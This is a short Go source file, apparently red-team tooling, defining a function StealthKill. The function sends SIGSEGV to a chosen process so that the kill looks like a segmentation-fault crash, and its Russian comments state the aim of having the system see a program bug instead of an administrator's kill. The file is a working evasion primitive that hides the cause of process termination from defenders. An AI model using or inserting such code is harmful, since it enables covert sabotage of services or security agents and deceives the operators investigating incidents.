package redteam

import (
	"fmt"
	"os"
	"syscall"
)

// StealthKill отправляет SIGSEGV процессу, имитируя краш
func StealthKill(pid int) error {
	process, err := os.FindProcess(pid)
	if err != nil {
		return err
	}
	
	// Посылаем сигнал 11 (SIGSEGV) - Segmentation Fault
	// Для системы это выглядит как баг в программе, а не убийство администратором
	err = process.Signal(syscall.SIGSEGV)
	if err != nil {
		return err
	}
	
	fmt.Printf("👻 Process %d successfully crashed (SegFault injected)\n", pid)
	return nil
}